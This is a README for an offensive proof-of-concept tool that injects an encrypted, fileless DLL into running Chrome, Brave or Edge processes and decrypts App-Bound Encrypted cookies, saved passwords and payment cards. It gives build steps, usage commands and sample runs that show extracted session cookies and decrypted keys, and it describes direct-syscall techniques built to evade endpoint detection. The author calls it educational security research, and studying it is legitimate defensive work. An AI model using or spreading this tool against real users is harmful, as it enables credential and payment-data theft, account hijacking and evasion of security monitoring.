# Chrome App-Bound Encryption Decryption

## 🚀 Overview

A proof-of-concept tool to decrypt **App-Bound Encrypted (ABE)** cookies, passwords, and payment methods from Chromium-based browsers (Chrome, Brave, Edge). This is achieved entirely in user-mode with no administrator rights required.

If you find this useful, I’d appreciate a coffee:  
[![ko-fi](https://ko-fi.com/img/githubbutton_sm.svg)](https://ko-fi.com/M4M61EP5XL)

## 🛡️ Background

Starting in **Chrome 127+**, Google began rolling out **App-Bound Encryption** to secure local user data:

1. **Key generation**: a per-profile AES-256-GCM key is created and wrapped by Windows DPAPI.
2. **Storage**: that wrapped key (Base64-encoded, prefixed with `APPB`) lands in your **Local State** file.
3. **Unwrapping**: Chrome calls the **IElevator** COM server, but **only** if the caller’s EXE lives in the browser’s install directory.

These path-validation checks prevent any external tool — even with direct DPAPI access — from unwrapping the ABE key.

## 🛠️ How It Works

**This project** injects a DLL into the running browser process using **Reflective DLL Injection (RDI)**. The RDI technique for x64 is based on [Stephen Fewer's original work](https://github.com/stephenfewer/ReflectiveDLLInjection), and for ARM64, it utilizes my method detailed in [ARM64-ReflectiveDLLInjection](https://github.com/xaitax/ARM64-ReflectiveDLLInjection). Once injected, the DLL:

1.  **Injector (`chrome_inject.exe`):** 
    * The payload DLL is not stored on disk. Instead, it is **encrypted with ChaCha20** and embedded directly into the injector's executable as a resource during compilation.
    * At runtime, the injector loads this encrypted resource into memory, decrypts it, and uses a **direct syscall engine** to perform a Reflective DLL Injection (RDI) of the payload into the target browser process.
    * This in-memory, fileless approach completely avoids on-disk artifacts for the payload, defeating static analysis and common EDR heuristics.
2.  **Injected Payload (In-Memory):** 
    * Once running in the browser's address space, the payload uses its privileged position to invoke the browser's internal IElevator COM server.
    * Because the request originates from within the trusted process, the COM server successfully decrypts the App-Bound master key.
    * The payload then uses this key to decrypt all sensitive data (cookies, passwords, payments) across all user profiles and streams the results back to the injector.

## 🔬 In-Depth Technical Analysis & Research

For a comprehensive understanding of Chrome's App-Bound Encryption, the intricacies of its implementation, the detailed mechanics of this tool's approach, and a broader discussion of related security vectors, please refer to my detailed research paper:

1.  ➡️ **[Chrome App-Bound Encryption (ABE) - Technical Deep Dive & Research Notes](docs/RESEARCH.md)**

    This document covers:
    * The evolution from DPAPI to ABE.
    * A step-by-step breakdown of the ABE mechanism, including `IElevator` COM interactions and key wrapping.
    * Detailed methodology of the DLL injection strategy used by this tool.
    * Analysis of encrypted data structures and relevant Chromium source code insights.
    * Discussion of alternative decryption vectors and Chrome's evolving defenses.

2.  ➡️ **[The Curious Case of the Cantankerous COM: Decrypting Microsoft Edge's App-Bound Encryption](docs/The_Curious_Case_of_the_Cantankerous_COM_Decrypting_Microsoft_Edge_ABE.md)**

    This article details the specific challenges and reverse engineering journey undertaken to achieve reliable ABE decryption for Microsoft Edge. It includes:
    *   An account of the initial issues and misleading error codes (`E_INVALIDARG`, `E_NOINTERFACE`).
    *   The process of using COM type library introspection (with Python `comtypes`) to uncover Edge's unique `IElevatorEdge` vtable structure and inheritance.
    *   How this insight led to tailored C++ interface stubs for successful interaction with Edge's ABE service.
    *   A practical look at debugging tricky COM interoperability issues.

3.  ➡️ **[COMrade ABE: Your Field Manual for App-Bound Encryption's COM Underbelly](docs/COMrade_ABE_Field_Manual.md)**

    This field manual introduces **COMrade ABE**, a Python-based dynamic analyzer for ABE COM interfaces, and dives into its practical applications:
    *   Explains the necessity for dynamic COM interface analysis due to browser variations and updates.
    *   Details COMrade ABE's methodology: registry scanning for service discovery, Type Library loading and parsing, and heuristic-based ABE method signature matching.
    *   Provides a comprehensive guide to interpreting COMrade ABE's output, including CLSIDs, IIDs (standard and C++ style), and the significance of verbose output details like VTable offsets, defining interfaces, and full inheritance chains.
    *   Highlights the utility of the auto-generated C++ stubs (`--output-cpp-stub`) for rapid development and research.
    *   Discusses how COMrade ABE aids in adapting to ABE changes, analyzing new Chromium browsers, and understanding vendor-specific COM customizations.

### ⚙️ Key Features

- 🔓 Full user-mode decryption & JSON export of cookies, passwords & payment methods.
- 🛡️ Fileless Payload Delivery: In-memory decryption and injection of an encrypted resource, leaving no DLL on disk.
- 🛡️ Direct syscall injection engine to bypass common endpoint defenses.
- 🌐 Works on **Google Chrome**, **Brave** & **Edge** (x64 & ARM64)
- 👥 Support for multiple browser profiles (Default, Profile 1, Profile 2, etc.)
- 📁 Customizable output directory for extracted data.
- 🛠️ No admin privileges required.
  

![image](https://github.com/user-attachments/assets/c2388201-ada9-4ac1-b242-de8f3b0d434f)

## 📦 Supported & Tested Versions

| Browser            | Tested Version (x64 & ARM64) |
| ------------------ | ---------------------------- |
| **Google Chrome**  | 138.0.7204.50                |
| **Brave**          | 1.79.126 (137.0.7151.119)    |
| **Microsoft Edge** | 138.0.3351.42                |

> [!NOTE]  
> The injector requires the target browser to be **running** unless you use `--start-browser`.

## 🔧 Build Instructions

This project uses a simple, robust build script that handles all compilation and resource embedding automatically.

1. **Clone** this repository.

2. Open a **Developer Command Prompt for VS** (or any MSVC‑enabled shell).

3. Run the build script from the project root:

   ```bash
    PS> make.bat
    --------------------------------------------------
    |          Chrome Injector Build Script          |
    --------------------------------------------------

    [INFO] Verifying build environment...
    [ OK ] Developer environment detected.
    [INFO] Target Architecture: arm64

    [INFO] Performing pre-build setup...
    [INFO]   - Creating fresh build directory: build
    [ OK ] Setup complete.

    -- [1/6] Compiling SQLite3 Library ------------------------------------------------
    [INFO]   - Compiling C object file...
    [INFO]   - Creating static library...
    [ OK ] SQLite3 library built successfully.

    -- [2/6] Compiling Payload DLL (chrome_decrypt.dll) ------------------------------------------------
    [INFO]   - Compiling C file (reflective_loader.c)...
    [INFO]   - Compiling C++ file (chrome_decrypt.cpp)...
    [INFO]   - Linking objects into DLL...
    [ OK ] Payload DLL compiled successfully.

    -- [3/6] Compiling Encryption Utility (encryptor.exe) ------------------------------------------------
    [INFO]   - Compiling and linking...
    [ OK ] Encryptor utility compiled successfully.

    -- [4/6] Encrypting Payload DLL ------------------------------------------------
    [INFO]   - Running encryption process...
    [ OK ] Payload encrypted to chrome_decrypt.enc.

    -- [5/6] Compiling Resource File ------------------------------------------------
    [INFO]   - Compiling .rc to .res...
    [ OK ] Resource file compiled successfully.

    -- [6/6] Compiling Final Injector (chrome_inject.exe) ------------------------------------------------
    [INFO]   - Compiling and linking...
    [ OK ] Final injector built successfully.

    --------------------------------------------------
    |                 BUILD SUCCESSFUL               |
    --------------------------------------------------

      Final Executable: .\chrome_inject.exe

    [INFO] Build successful. Final artifacts are ready.
   ```

This single command will compile all components and produce a self-contained `chrome_inject.exe` in the root directory.

###  Automated Builds with GitHub Actions

This project uses GitHub Actions to automatically build the injector executable ( `chrome_inject.exe`) for both **x64** and **ARM64** architectures

You can find the latest pre-compiled binaries on the [**Releases page**](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption/releases). The executables for both architectures are packaged together in a single, convenient .zip file.

**Release Package Contents:**
- `chrome_inject_x64.exe`
- `chrome_inject_arm64.exe`

## 🚀 Usage

```bash
PS> .\chrome_inject.exe [options] <chrome|brave|edge>
```

### Options

Options

- `--start-browser` or `-s`
  Auto-launch the browser if it’s not already running.

- `--output-path <path>` or `-o <path>`
  Specifies the base directory for output files.
  Defaults to `.\output\` relative to the injector's location.
  Data will be organized into subfolders: `<path>/<BrowserName>/<ProfileName>/`.

- `--verbose` or `-v`
  Enable extensive debugging output from the injector.

- `--help` or `-h`
  Show this help message.

### Examples

```bash
# Standard injection into a running Chrome process:
PS> .\chrome_inject.exe chrome

# Auto-start Brave and show verbose debug logs:
PS> .\chrome_inject.exe --start-browser --verbose brave
```

#### Normal Run

```bash
PS> .\chrome_inject.exe --start-browser chrome
------------------------------------------------
|  Chrome App-Bound Encryption Decryption      |
|  Direct Syscall Injection Engine             |
|  x64 & ARM64 | Cookies, Passwords, Payments  |
|  v0.12.0 by @xaitax                          |
------------------------------------------------

[*] Chrome not running, launching...
[+] Chrome (v. 138.0.7204.50) launched w/ PID 23372
[+] DLL injected via Reflective DLL Injection (RDI with Syscalls)
[*] Waiting for DLL (Pipe: \\.\pipe\ChromeDecryptIPC_a98ad5d7-dcb6-4db2-a744-05c418297baa)

[*] Decryption process started for Chrome
[+] COM library initialized (APARTMENTTHREADED).
[+] Reading Local State file: C:\Users\ah\AppData\Local\Google\Chrome\User Data\Local State
[+] Decrypted AES Key: 97fd6072e90096a6f00dc4cb7d9d6d2a7368122614a99e1cc5aa980fbdba886b
[*] Processing profile: Default
     [*] 9 cookies extracted to C:\Users\ah\Documents\GitHub\Chrome-App-Bound-Encryption-Decryption\output\Chrome\Default\cookies.txt
     [*] 1 passwords extracted to C:\Users\ah\Documents\GitHub\Chrome-App-Bound-Encryption-Decryption\output\Chrome\Default\passwords.txt
     [*] 1 payments extracted to C:\Users\ah\Documents\GitHub\Chrome-App-Bound-Encryption-Decryption\output\Chrome\Default\payments.txt
[*] Processing profile: Profile 1
     [*] 136 cookies extracted to C:\Users\ah\Documents\GitHub\Chrome-App-Bound-Encryption-Decryption\output\Chrome\Profile 1\cookies.txt
[*] Decryption process finished.

[+] DLL signaled completion or pipe interaction ended.
[*] Chrome terminated by injector.
```

#### Verbose

```bash
PS> .\chrome_inject.exe --verbose --start-browser chrome
------------------------------------------------
|  Chrome App-Bound Encryption Decryption      |
|  Direct Syscall Injection Engine             |
|  x64 & ARM64 | Cookies, Passwords, Payments  |
|  v0.12.0 by @xaitax                          |
------------------------------------------------

[#] [Syscalls] Found and sorted 489 Zw* functions.
[#] [Syscalls] Successfully initialized all syscall stubs via Tartarus Gate.
[#] [Syscalls]   - NtAllocateVirtualMemory found at 140726530544016
[#] Named pipe server created: \\.\pipe\ChromeDecryptIPC_1a7002a9-b8fd-4788-8e21-1a3c95f8cf41
[#] Snapshotting processes for msedge.exe
[#] Found process msedge.exe PID=16772
[#] Architecture match: Injector=ARM64, Target=ARM64
[#] Loading payload DLL from embedded resource.
[#] Successfully loaded embedded resource 'PAYLOAD_DLL'. Size: 1364992 bytes.
[#] Decrypting payload in-memory with ChaCha20...
[#] Payload decrypted.
[#] RDI: ReflectiveLoader file offset: 0x138d0
[#] RDI: Memory allocated in target at 0x28a070f0000
[#] RDI: Calculated remote ReflectiveLoader address: 0x28a071038d0
[#] RDI: Waiting for remote ReflectiveLoader thread...
[+] DLL injected via Reflective DLL Injection (RDI with Syscalls)
[#] Waiting for DLL to connect to named pipe...
[#] DLL connected to named pipe.
[#] Sent message to pipe: VERBOSE_TRUE
[#] Sent message to pipe: C:\Users\ah\Documents\GitHub\Chrome-App-Bound-Encryption-Decryption\output
[*] Waiting for DLL (Pipe: \\.\pipe\ChromeDecryptIPC_1a7002a9-b8fd-4788-8e21-1a3c95f8cf41)

[*] Decryption process started for Edge
[+] COM library initialized (APARTMENTTHREADED).
[+] Reading Local State file: C:\Users\ah\AppData\Local\Microsoft\Edge\User Data\Local State
[+] Decrypted AES Key: b0334fad7f5805362cb4c44b144a95ab7a68f7346ef99eb3f175f09db08c8fd9
[*] Processing profile: Default
     [*] 156 cookies extracted to C:\Users\ah\Documents\GitHub\Chrome-App-Bound-Encryption-Decryption\output\Edge\Default\cookies.txt
[*] Decryption process finished.
[#] DLL completion signal received.

[+] DLL signaled completion or pipe interaction ended.
[#] Browser was already running; injector will not terminate it.
[#] Injector finished.
[#] Freed remote pipe name memory.
```

## 📂 Data Extraction

Once decryption completes, data is saved to the specified output path (defaulting to `.\output\` if not specified via `--output-path`). Files are organized as follows:

**Base Path:** `YOUR_CHOSEN_PATH` (e.g., `.\output\` or the path you provide)
**Structure:** <Base Path>/<BrowserName>/<ProfileName>/<data_type>.txt

Example paths (assuming default output location):**

- 🍪 **Cookies (Chrome Default profile):** .\output\Chrome\Default\cookies.txt
- 🔑 **Passwords (Edge Profile 1):** .\output\Edge\Profile 1\passwords.txt
- 💳 **Payment Methods (Brave Default profile):** .\output\Brave\Default\payments.txt

### 🍪 Cookie Extraction

Each cookie file is a JSON array of objects:

```json
[
  {
    "host": "accounts.google.com",
    "name": "ACCOUNT_CHOOSER",
    "value": "AFx_qI781-…"
  },
  {
    "host": "mail.google.com",
    "name": "OSID",
    "value": "g.a000uwj5ufIS…"
  },
  …
]
```

### 🔑 Password Extraction

Each password file is a JSON array of objects:

```json
[
  {
    "origin": "https://example.com/login",
    "username": "user@example.com",
    "password": "••••••••••"
  },
  {
    "origin": "https://another.example.com",
    "username": "another_user",
    "password": "••••••••••"
  }
  …
]
```

### 💳 Payment Method Extraction

Each payment file is a JSON array of objects:

```json
[
  {
    "name_on_card": "John Doe",
    "expiration_month": 12,
    "expiration_year": 2030,
    "card_number": "••••••••••1234",
    "cvc": "•••"
  },
  {
    "name_on_card": "Jane Smith",
    "expiration_month": 07,
    "expiration_year": 2028,
    "card_number": "••••••••••5678",
    "cvc": "•••"
  }
  …
]
```

## 🆕 Changelog

### v0.12
- **Fileless Payload Execution (Encrypted Resource Delivery)**: Migrated the payload DLL from a disk-based file to an in-memory, **ChaCha20-encrypted** resource embedded within the injector. The payload is now decrypted at runtime and reflectively injected, eliminating on-disk artifacts and defeating static analysis.
- **Code Modernization (Full C++ Refactoring)**: Re-architected the entire codebase with modern C++ principles.
- **Professional Build System**: Implemented a robust make.bat script for clean, reliable, and configurable local builds. 

### v0.11
- **Kernel-Level Execution Syscall Engine (Halo's & Tartarus Gate Fusion)**: Implemented a multi-architecture syscall resolution system for improved stealth. This hybrid engine combines the strengths of multiple modern techniques:
  - The injector first attempts a [Halo's Gate](https://blog.sektor7.net/#!res/2021/halosgate.md) approach by dynamically calculating the required System Service Numbers (SSNs) and hunting for clean, unhooked syscall stubs within ntdll.dll.
  - In heavily monitored environments where no clean stubs can be found (as discovered on Windows on ARM64 installations), the system automatically pivots to a [Tartarus Gate](https://github.com/trickster0/TartarusGate) methodology. It directly leverages the function pointers of the (potentially hooked) Zw functions, ensuring execution continuity by passing through the EDR's hooks to the kernel.
  - This dual-pronged strategy provides maximum stealth and operational resilience across diverse target environments on both x64 and ARM64.
- **Stealth Enhancement (IPC)**: Transitioned from file-based IPC to **Named Pipes** for configuration and logging. `chrome_inject.exe` (server) passes a unique pipe name to the target's remote memory. `chrome_decrypt.dll` (client) uses this pipe for receiving output path configuration and for streaming log data/completion signals directly to the injector, minimizing on-disk artifacts and eliminating global named event usage.

### v0.10
- **Refactor**: Switched to **Reflective DLL Injection (RDI)** as the sole injection method, removing older `LoadLibrary` and `NtCreateThreadEx` options for enhanced stealth. (x64 RDI based on [Stephen Fewer's work](https://github.com/stephenfewer/ReflectiveDLLInjection), ARM64 RDI based on [xaitax/ARM64-ReflectiveDLLInjection](https://github.com/xaitax/ARM64-ReflectiveDLLInjection)).

### v0.9
- **New**: Added `--output-path` (`-o`) argument to `chrome_inject.exe` for user-configurable output directory. Output files are now organized by BrowserName/ProfileName/data_type.txt.
- **New**: Implemented support for automatically detecting and decrypting data from multiple browser profiles (e.g., Default, Profile 1, Profile 2).
- **CI/CD**: Integrated GitHub Actions workflow for automated building of x64 and ARM64 binaries, and automatic release creation upon new version tags.
- **Project Structure**: Reorganized the repository into src/, libs/, docs/, and tools/ directories for better maintainability.

### v0.8

- **New**: **Reliable Microsoft Edge Decryption:** Implemented support for Edge's native App-Bound Encryption COM interface (`IElevatorEdge`), resolving previous inconsistencies and removing dependency on Brave Browser being installed. This involved detailed COM interface analysis and tailored C++ stubs for Edge's specific vtable layout.

### v0.7

- **New**: Implemented Kernel Named Events for flawless timing between Injector and DLL operations.
- **Improved**: Major refactoring of both Injector and DLL for enhanced stability, performance, and maintainability.
- **Improved**: Strict RAII implemented for all system resources (Handles, COM, SQLite) to prevent leaks.
- **Improved**: More accurate and immediate error code capture and reporting.
- **Improved**: Adaptive Locking Bypass / Enhanced Locked File Access (SQLite nolock=1 for Login Data/Payment Methods)
- **Improved**: Dynamic Path Resolution / Dynamic Path Discovery (modern Windows APIs)
- **Improved**: Optimized DLL's browser termination logic.

### v0.6

- **New**: Full Username & Password extraction
- **New**: Full Payment Information (e.g., Credit Card) extraction

### v0.5

- **New**: Full Cookie extraction into JSON format

### v0.4

- **New**: selectable injection methods (`--method load|nt`)
- **New**: auto‑start the browser if not running (`--start-browser`)
- **New**: verbose debug output (`--verbose`)
- **New**: automatically terminate the browser after decryption
- **Improved**: Injector code refactoring

Further Links:

- [Google Security Blog](https://security.googleblog.com/2024/07/improving-security-of-chrome-cookies-on.html)
- [Chrome app-bound encryption Service](https://drive.google.com/file/d/1xMXmA0UJifXoTHjHWtVir2rb94OsxXAI/view)
- [snovvcrash](https://x.com/snovvcrash)
- [SilentDev33](https://github.com/SilentDev33/ChromeAppBound-key-injection)

## 📜 License

This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.

## 💡 Project Philosophy & Disclaimer

> [!IMPORTANT]
> This is a hobby project created for educational and security research purposes. It serves as a personal learning experience and a playing field for exploring advanced Windows concepts.
>
> **This tool is NOT intended to be a fully-featured infostealer or a guaranteed EDR evasion tool.** While it employs advanced techniques, its primary goal is to demonstrate and dissect the ABE mechanism, not to provide operational stealth for malicious use. Please ensure compliance with all relevant legal and ethical guidelines.
